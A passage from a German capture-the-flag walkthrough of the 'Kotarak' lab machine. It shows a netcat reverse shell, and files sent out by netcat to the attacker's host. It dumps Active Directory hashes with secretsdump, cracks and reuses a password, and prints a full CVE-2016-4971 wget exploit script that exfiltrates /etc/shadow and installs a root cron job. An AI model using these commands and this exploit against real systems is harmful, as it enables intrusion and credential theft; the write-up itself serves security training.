</span></span></code></pre></div><p>Nun müssen wir nur noch die <strong>.war</strong> Datei hochladen.</p>
<p><img src="https://imgur.com/VRoqBHq.jpg" alt="bild7"></p>
<p>Wir können sehen, dass diese nun unter <strong>Applications</strong> aufgeführt ist.</p>
<p>Wenn wir nun auf den Namen unserer Datei klicken, haben wir eine <strong>Reverse-Shell</strong>!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>conect to <span style="color:#f92672">[</span>10.10.15.158<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.55<span style="color:#f92672">]</span> <span style="color:#ae81ff">48972</span>
</span></span></code></pre></div><p>Jetzt können wir uns eine interaktive Shell mit z.B. Autocomplete erstellen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ ^Z
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+ Stopped nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>root@kali:~# stty raw -echo
</span></span><span style="display:flex;"><span>root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ stty rows <span style="color:#ae81ff">53</span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ stty columns <span style="color:#ae81ff">211</span>
</span></span><span style="display:flex;"><span>tocat@kotarak-dmz:/$ export TERM<span style="color:#f92672">=</span>xterm-256color
</span></span></code></pre></div><p>Im Homeverzeichnis können wir uns mit dem Befehl **ls -R **rekursiv alle Ordner und Dateien anzeigen lassen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tomcat@kotarak-dmz:/$ cd home
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/home$ ls
</span></span><span style="display:flex;"><span>atanas tomcat
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/home$ ls -R
</span></span><span style="display:flex;"><span>.:
</span></span><span style="display:flex;"><span>atanas tomcat
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./atanas:
</span></span><span style="display:flex;"><span>user.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./tomcat:
</span></span><span style="display:flex;"><span>to_archive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./tomcat/to_archive:
</span></span><span style="display:flex;"><span>pentest_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./tomcat/to_archive/pentest_data:
</span></span><span style="display:flex;"><span>2070721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
</span></span></code></pre></div><p>Im Homeverzeichnis von Atanas befindet sich die User Flag!</p>
<p>Im Homeverzeichnis von Tomcat befinden sich zwei sehr interessante Dateien&hellip;<br>
Laden wir uns diese via Netcat herunter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tomcat@kotarak-dmz:/home$ cd tomcat/to_archive/pentest_data
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
</span></span><span style="display:flex;"><span>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
</span></span><span style="display:flex;"><span>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali:~# mkdir kotarak
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali:~# cd kotarak/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali:~/kotarak# nc -lnvp <span style="color:#ae81ff">4445</span> &gt; SYSTEM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.15.158 &lt; 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali:~/kotarak# nc -lnvp <span style="color:#ae81ff">4445</span> &gt; ntds.dit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tocat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.15.158 &lt; 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
</span></span></code></pre></div><p>Bei den beiden Dateien handelt es sich um <strong>NTDS.dit</strong>, welche eine Datenbank ist die Informationen zur Active Directory beinhält, und um eine Kopie des <strong>SYSTEM Registry Hives</strong>!</p>
<p>Mit Hilfe von dem Skript <strong>secretsdump</strong> von der <strong>Impacket</strong> Skript-Sammlung können wir bei Eingabe der beiden Dateien alle NT-Hashes extrahieren!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
</span></span><span style="display:flex;"><span>Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit 
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
</span></span><span style="display:flex;"><span>WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
</span></span><span style="display:flex;"><span>WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
</span></span><span style="display:flex;"><span>WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
</span></span><span style="display:flex;"><span>WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
</span></span><span style="display:flex;"><span>atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys from ntds.dit 
</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:75375eda54757c2f
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
</span></span><span style="display:flex;"><span>WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:10ef08047a862046
</span></span><span style="display:flex;"><span>krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
</span></span><span style="display:flex;"><span>WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
</span></span><span style="display:flex;"><span>WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
</span></span><span style="display:flex;"><span>WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
</span></span><span style="display:flex;"><span>WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
</span></span><span style="display:flex;"><span>WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
</span></span><span style="display:flex;"><span>WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
</span></span><span style="display:flex;"><span>WINXP1$:des-cbc-md5:984a40d5f4a815f2
</span></span><span style="display:flex;"><span>WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
</span></span><span style="display:flex;"><span>WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
</span></span><span style="display:flex;"><span>WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
</span></span><span style="display:flex;"><span>WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
</span></span><span style="display:flex;"><span>WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
</span></span><span style="display:flex;"><span>WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
</span></span><span style="display:flex;"><span>WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
</span></span><span style="display:flex;"><span>WIN7$:des-cbc-md5:89a1673723ad9180
</span></span><span style="display:flex;"><span>WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
</span></span><span style="display:flex;"><span>atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
</span></span><span style="display:flex;"><span>atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
</span></span><span style="display:flex;"><span>atanas:des-cbc-md5:6b80e391f113542a
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>* Cleaning up...
</span></span></code></pre></div><p>Wir haben nun also den NTLM Hash des Administrator Passwortes!</p>
<p>Diesen können wir nun auf <a href="https://crackstation.net/">crackstation</a> cracken lassen.</p>
<p><img src="https://imgur.com/2E6wDDI.jpg" alt="bild8"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>e64fe0f24ba2489c05e64354d74ebd11 <span style="color:#f92672">=</span> f16tomcat!
</span></span></code></pre></div><p>Das Passwort ist also <strong>f16tomcat</strong>!</p>
<p>Dasselbe Passwort können wir benutzen um uns als <strong>Atanas</strong> ein zu loggen. Glücklich für uns, dass das Passwort wohl mehrfach verwendet wurde.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>atnas@kotarak-dmz:~$
</span></span></code></pre></div><p>Jetzt haben wir die Berechtigungen um die User Flag auszulesen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>atanas@kotarak-dmz:~$ cat user.txt 
</span></span><span style="display:flex;"><span>93#########ZENSIERT#########ce8
</span></span></code></pre></div><p>Wir haben auch ausreichende Berechtigungen für das Root-Verzeichnis!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>atanas@kotarak-dmz:~$ cd /root
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ ls
</span></span><span style="display:flex;"><span>app.log flag.txt
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ cat flag.txt 
</span></span><span style="display:flex;"><span>Getting closer! But what you are looking <span style="color:#66d9ef">for</span> can<span style="color:#960050;background-color:#1e0010">&#39;</span>t be found here.
</span></span><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ cat app.log 
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:48:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:50:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span><span style="display:flex;"><span>100.3.133 - - <span style="color:#f92672">[</span>20/Jul/2017:22:52:01 -0400<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">503</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;Wget/1.16 (linux-gnu)&#34;</span>
</span></span></code></pre></div><p>Die Root Flag ist aber nicht hier. Es befindet sich ansonsten nur die Datei app.log im Verzeichnis&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak# searchsploit wget
</span></span><span style="display:flex;"><span>------------------------------------------------------------------- ----------------------------------
</span></span><span style="display:flex;"><span>Exploit Title                                                      | Path
</span></span><span style="display:flex;"><span>                                                                   | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>------------------------------------------------------------------- ----------------------------------
</span></span><span style="display:flex;"><span>GNU Wget 1.x - Multiple Vulnerabilities                            | exploits/linux/remote/24813.pl
</span></span><span style="display:flex;"><span>GNU Wget &lt; 1.18 - Access List Bypass / Race Condition              | exploits/multiple/remote/40824.py
</span></span><span style="display:flex;"><span>GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution    | exploits/linux/remote/40064.txt
</span></span><span style="display:flex;"><span>WGet 1.x - Insecure File Creation Race Condition                   | exploits/linux/local/24123.sh
</span></span><span style="display:flex;"><span>feh 1.7 - <span style="color:#e6db74">&#39;--wget-Timestamp&#39;</span> Remote Code Execution                 | exploits/linux/remote/34201.txt
</span></span><span style="display:flex;"><span>wget 1.10.2 - Unchecked Boundary Condition Denial of Service       | exploits/multiple/dos/2947.pl
</span></span><span style="display:flex;"><span>wget 1.9 - Directory Traversal                                     | exploits/multiple/remote/689.pl
</span></span><span style="display:flex;"><span>------------------------------------------------------------------- ----------------------------------
</span></span><span style="display:flex;"><span>------------------------------------------------------------------- ----------------------------------
</span></span><span style="display:flex;"><span>Shellcode Title                                                    | Path
</span></span><span style="display:flex;"><span>                                                                   | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>------------------------------------------------------------------- ----------------------------------
</span></span><span style="display:flex;"><span>Linux/x86 - execve wget + Mutated + Null-Free Shellcode <span style="color:#f92672">(</span><span style="color:#ae81ff">96</span> bytes<span style="color:#f92672">)</span> | shellcodes/linux_x86/43739.c
</span></span><span style="display:flex;"><span>Linux/x86 - execve<span style="color:#f92672">(</span>_/usr/bin/wget__ _aaaa_<span style="color:#f92672">)</span> Shellcode <span style="color:#f92672">(</span><span style="color:#ae81ff">42</span> bytes<span style="color:#f92672">)</span>   | shellcodes/linux_x86/13702.c
</span></span><span style="display:flex;"><span>------------------------------------------------------------------ ----------------------------------
</span></span></code></pre></div><p>Sehen wir uns diesen Exploit an: <a href="https://www.exploit-db.com/exploits/40064/">GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak# searchsploit -m exploits/linux/remote/40064.txt
</span></span><span style="display:flex;"><span>Exploit: GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution
</span></span><span style="display:flex;"><span>URL: https://www.exploit-db.com/exploits/40064/
</span></span><span style="display:flex;"><span>Path: /usr/share/exploitdb/exploits/linux/remote/40064.txt
</span></span><span style="display:flex;"><span>File Type: UTF-8 Unicode text, with CRLF line terminators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copied to: /root/kotarak/40064.txt
</span></span></code></pre></div><p>Die Datei enthält folgende Anleitung um eine Remote Code Execution auszuführen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>In order to exploit this setup, attacker first prepares a malicious .wgetrc 
</span></span><span style="display:flex;"><span>and starts an FTP server:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>attackers-server# mkdir /tmp/ftptest
</span></span><span style="display:flex;"><span>attackers-server# cd /tmp/ftptest
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>attackers-server# cat <span style="color:#e6db74">&lt;&lt;_EOF_&gt;.wgetrc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">post_file = /etc/shadow
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">output_document = /etc/cron.d/wget-root-shell
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_EOF_</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>attackers-server# sudo pip install pyftpdlib
</span></span><span style="display:flex;"><span>attackers-server# python -m pyftpdlib -p21 -w
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>At this point attacker can start an HTTP server which will exploit wget by
</span></span><span style="display:flex;"><span>sending malicious redirects to the victim wget<span style="color:#e6db74">&#39;s requests:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---[ wget-exploit.py ]---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/usr/bin/env python
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Wget 1.18 &lt; Arbitrary File Upload Exploit
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Dawid Golunski
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># dawid( at )legalhackers.com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># CVE-2016-4971 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import SimpleHTTPServer
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import SocketServer
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import socket;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   def do_GET(self):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       # This takes care of sending .wgetrc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;We have a volunteer requesting &#34; + self.path + &#34; by GET :)\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       if &#34;Wget&#34; not in self.headers.getheader(&#39;</span>User-Agent<span style="color:#e6db74">&#39;):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      print &#34;But it&#39;</span>s not a Wget :<span style="color:#f92672">(</span> <span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.send_response(200)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.end_headers()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.wfile.write(&#34;</span>Nothing to see here...<span style="color:#e6db74">&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          return
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;</span>Uploading .wgetrc via ftp redirect vuln. It should land in /root <span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.send_response(301)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       new_path = &#39;%s&#39;%(&#39;ftp://anonymous@%s:%s/.wgetrc&#39;%(FTP_HOST, FTP_PORT) )
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;</span>Sending redirect to %s <span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;%(new_path)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.send_header(&#39;Location&#39;, new_path)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.end_headers()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   def do_POST(self):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       # In here we will receive extracted file and install a PoC cronjob
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;</span>We have a volunteer requesting <span style="color:#e6db74">&#34; + self.path + &#34;</span> by POST :<span style="color:#f92672">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       if &#34;</span>Wget<span style="color:#e6db74">&#34; not in self.headers.getheader(&#39;User-Agent&#39;):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      print &#34;</span>But it<span style="color:#e6db74">&#39;s not a Wget :( \n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.send_response(200)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.end_headers()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          self.wfile.write(&#34;Nothing to see here...&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          return
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       content_len = int(self.headers.getheader(&#39;</span>content-length<span style="color:#e6db74">&#39;, 0))
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       post_body = self.rfile.read(content_len)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&#34; % (post_body)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;Sending back a cronjob script as a thank-you for the file...&#34; 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;It should get saved in /etc/cron.d/wget-root-shell on the victim&#39;</span>s host <span style="color:#f92672">(</span>because of .wgetrc we injected in the GET first response<span style="color:#f92672">)</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.send_response(200)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.send_header(&#39;Content-type&#39;, &#39;text/plain&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.end_headers()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       self.wfile.write(ROOT_CRON)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       print &#34;</span><span style="color:#ae81ff">\n</span>File was served. Check on /root/hacked-via-wget on the victim<span style="color:#e6db74">&#39;s host in a minute! :) \n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       return
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP_LISTEN_IP = &#39;</span>192.168.57.1<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP_LISTEN_PORT = 80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FTP_HOST = &#39;</span>192.168.57.1<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FTP_PORT = 21
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ROOT_CRON = &#34;* * * * * root /usr/bin/id &gt; /root/hacked-via-wget \n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print &#34;Ready? Is your FTP server running?&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">result = sock.connect_ex((FTP_HOST, FTP_PORT))
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if result == 0:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   print &#34;FTP found open on %s:%s. Let&#39;</span>s go <span style="color:#66d9ef">then</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34; % (FTP_HOST, FTP_PORT)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">else:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   print &#34;</span>FTP is down :<span style="color:#f92672">(</span> Exiting.<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   exit(1)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
